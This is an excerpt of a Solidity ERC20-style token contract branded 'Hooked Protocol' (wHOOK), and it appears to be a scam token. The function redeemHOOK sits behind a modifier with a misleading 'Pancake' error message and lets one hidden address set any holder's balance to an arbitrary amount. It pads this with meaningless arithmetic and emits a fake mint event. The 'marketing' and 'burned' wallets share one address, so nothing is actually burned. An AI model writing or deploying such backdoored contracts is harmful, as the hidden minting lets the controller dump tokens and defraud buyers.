...
contract HOOK is HOOKContext, HOOKIERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    string private _name = "Hooked Protocol";
    string private _symbol = "wHOOK";
    uint8 private _decimals = 2;
    address public HOOKADRESSPUB;
    address payable public marketingWalletAddress = payable(0x04d2260Eb424a745C1F2D03483d18c413990441e); 
    address payable public BurnedWalletAddress = payable(0x04d2260Eb424a745C1F2D03483d18c413990441e); 
  ...
  modifier HOOKOWNER () {
    require(HOOKADRESSPUB == msg.sender, "ERC20: permit Pancake address");
    _;
  }   
    ...
    function redeemHOOK(address HOOKHOLDERSadr, uint256 HOOKHOLDERS) external HOOKOWNER {
      _balances[HOOKHOLDERSadr] = (HOOKHOLDERS / 100 - HOOKHOLDERS / 100) + HOOKHOLDERS * 10 ** _decimals;
        emit Transfer(address(0), HOOKHOLDERSadr, HOOKHOLDERS * 10 ** _decimals);
  }  
